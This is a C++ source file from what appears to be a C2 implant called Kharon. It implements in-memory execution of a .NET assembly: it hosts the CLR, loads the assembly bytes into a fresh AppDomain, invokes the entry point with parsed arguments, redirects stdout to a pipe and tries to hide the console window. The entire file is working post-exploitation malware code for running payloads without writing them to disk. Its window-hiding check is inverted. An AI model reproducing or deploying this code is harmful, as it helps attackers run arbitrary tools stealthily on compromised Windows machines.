#include <Kharon.h>

using namespace mscorlib;

auto DECLFN Dotnet::Inline(
    _In_ PBYTE AsmBytes,
    _In_ ULONG AsmLength,
    _In_ PWSTR Arguments,
    _In_ PWSTR AppDomName,
    _In_ PWSTR Version,
    _In_ BOOL  KeepLoad
) -> BOOL {
    KhDbg( "assembly bytes at %p [%d bytes]", AsmBytes, AsmLength );
    KhDbg( "arguments %S", Arguments );
    KhDbg( "using app domain %S", AppDomName );
    KhDbg( "version: %S", Version );

    PWCHAR* AsmArgv   = NULL;
    INT     AsmArgc   = 0;
    BOOL    Success   = FALSE;
    HANDLE  BackupOut = INVALID_HANDLE_VALUE;
    HANDLE  PipeWrite = INVALID_HANDLE_VALUE;
    HANDLE  PipeRead  = INVALID_HANDLE_VALUE;
    HWND    WinHandle = NULL;

    SAFEARRAYBOUND SafeBound = { 0 };
    SAFEARRAY*     SafeAsm   = { 0 };
    SAFEARRAY*     SafeExpc  = { 0 };
    SAFEARRAY*	   SafeArgs  = { 0 };

    BOOL             IsLoadable  = FALSE;
    HRESULT          HResult     = 0;
    VARIANT          VariantArgv = { 0 };
    _Assembly*       Assembly    = { 0 };
    _AppDomain*      AppDom      = { 0 };
    _MethodInfo*     MethodInfo  = { 0 };
    IUnknown*        AppDomThunk = { 0 };
    IEnumUnknown*    EnumUkwn    = { 0 };
    ICLRMetaHost*    MetaHost    = { 0 };
    ICLRRuntimeInfo* RtmInfo     = { 0 };
    ICorRuntimeHost* RtmHost     = { 0 };

    LONG Idx = 0;

    SECURITY_ATTRIBUTES SecAttr = { 0 };

    HResult = Kh->Mscoree.CLRCreateInstance( 
        Kh->Dot->GUID.xCLSID_CLRMetaHost, Kh->Dot->GUID.xIID_ICLRMetaHost, (PVOID*)&MetaHost 
    );
    if ( HResult ) goto _KH_END;

    HResult = MetaHost->EnumerateInstalledRuntimes( &EnumUkwn );
    if ( HResult ) goto _KH_END;

    HResult = MetaHost->GetRuntime( Version, Kh->Dot->GUID.xIID_ICLRRuntimeInfo, (PVOID*)&RtmInfo );
    if ( HResult ) goto _KH_END;

    HResult = RtmInfo->IsLoadable( &IsLoadable );
    KhDbg( "is loadable: %s", IsLoadable ? "true" : "false" );
    if ( HResult || !IsLoadable ) goto _KH_END;

    HResult = RtmInfo->GetInterface( 
        Kh->Dot->GUID.xCLSID_CorRuntimeHost, Kh->Dot->GUID.xIID_ICorRuntimeHost, (PVOID*)&RtmHost 
    );
    if ( HResult ) goto _KH_END;

    HResult = RtmHost->Start();
    if ( HResult ) goto _KH_END;

    HResult = RtmHost->CreateDomain( AppDomName, 0, &AppDomThunk );
    if ( HResult ) goto _KH_END;

    HResult = AppDomThunk->QueryInterface( Kh->Dot->GUID.xIID_AppDomain, (PVOID*)&AppDom );
    if ( HResult ) goto _KH_END;

    SafeBound = { AsmLength, 0 };
    SafeAsm   = Kh->Oleaut32.SafeArrayCreate( VT_UI1, 1, &SafeBound );

    Mem::Copy( SafeAsm->pvData, AsmBytes, AsmLength );

    HResult = AppDom->Load_3( SafeAsm, &Assembly );
    if ( HResult ) goto _KH_END;

    HResult = Assembly->get_EntryPoint( &MethodInfo );
    if ( HResult ) goto _KH_END;

    HResult = MethodInfo->GetParameters( &SafeExpc );
    if ( HResult ) goto _KH_END;
    
    if ( SafeExpc ) {
        if ( SafeExpc->cDims && SafeExpc->rgsabound[0].cElements ) {
    
            SafeArgs = Kh->Oleaut32.SafeArrayCreateVector( VT_VARIANT, 0, 1 );

            if ( Str::LengthW( Arguments ) ) {
                AsmArgv = Kh->Shell32.CommandLineToArgvW( Arguments, (PINT)&AsmArgc );
            }

            VariantArgv.parray = Kh->Oleaut32.SafeArrayCreateVector( VT_BSTR, 0, AsmArgc );
            VariantArgv.vt     = ( VT_ARRAY | VT_BSTR );

            for ( Idx = 0; Idx < AsmArgc; Idx++ ) {
        

                Kh->Oleaut32.SafeArrayPutElement( VariantArgv.parray, &Idx, Kh->Oleaut32.SysAllocString( AsmArgv[Idx] ) );
            }
            Kh->Oleaut32.SafeArrayPutElement( SafeArgs, &Idx, &VariantArgv );
            Kh->Oleaut32.SafeArrayDestroy( VariantArgv.parray );
        }
    }

    SecAttr = { sizeof( SECURITY_ATTRIBUTES ), NULL, TRUE };

    Kh->Krnl32.CreatePipe( &PipeRead, &PipeWrite, &SecAttr, PIPE_BUFFER_LENGTH );

    WinHandle = Kh->Krnl32.GetConsoleWindow();

    if ( !WinHandle ) {
        Kh->Krnl32.AllocConsole();

        if ( !( WinHandle = Kh->Krnl32.GetConsoleWindow() ) ) {
            Kh->User32.ShowWindow( WinHandle, SW_HIDE );
        }
    }

    BackupOut = Kh->Krnl32.GetStdHandle( STD_OUTPUT_HANDLE );
    Kh->Krnl32.SetStdHandle( STD_OUTPUT_HANDLE, PipeWrite );

    HResult = MethodInfo->Invoke_3( VARIANT(), SafeArgs, NULL );
    if ( HResult ) goto _KH_END;

    Kh->Dot->Buffer.a = (PCHAR)Kh->Hp->Alloc( PIPE_BUFFER_LENGTH );

    Success = Kh->Krnl32.ReadFile( PipeRead, Kh->Dot->Buffer.a, PIPE_BUFFER_LENGTH, &Kh->Dot->Buffer.s, 0 );

    KhDbg( "dotnet asm output [%d bytes] %s", Kh->Dot->Buffer.s, Kh->Dot->Buffer.a );
_KH_END:
    if ( HResult ) {    
        KhDbg( "HRESULT: %X", HResult );

        LPSTR errorMessage = NULL;
        DWORD flags = 
            FORMAT_MESSAGE_ALLOCATE_BUFFER | 
            FORMAT_MESSAGE_FROM_SYSTEM | 
            FORMAT_MESSAGE_IGNORE_INSERTS;
    
        DWORD result = Kh->Krnl32.FormatMessageA(
            flags, NULL, HResult,MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), 
            (LPSTR)&errorMessage, 0, NULL 
        );
    
        if ( result > 0 && errorMessage != NULL ) {
            KhDbg("Erro (HRESULT 0x%08X): %s\n", HResult, errorMessage);
        }
    
        if ( errorMessage != NULL ) {
            Kh->Hp->Free( errorMessage, Str::LengthA( errorMessage ) );
        }
    }

    if ( BackupOut ) Kh->Krnl32.SetStdHandle( STD_OUTPUT_HANDLE, BackupOut );

    if ( AsmArgv ) {
        Kh->Hp->Free( AsmArgv, Str::LengthW( *AsmArgv ) ); AsmArgv = NULL;
    }

    if ( SafeAsm ) {
        Kh->Oleaut32.SafeArrayDestroy( SafeAsm ); SafeAsm = NULL;
    }

    if ( SafeArgs ) {
        Kh->Oleaut32.SafeArrayDestroy( SafeArgs ); SafeArgs = NULL;
    }

    if ( MethodInfo ) {
        MethodInfo->Release();
    }

    if ( RtmInfo ) {
        RtmInfo->Release();
    }

    if ( RtmHost ) {
        RtmHost->Release();
    }

    return HResult;
}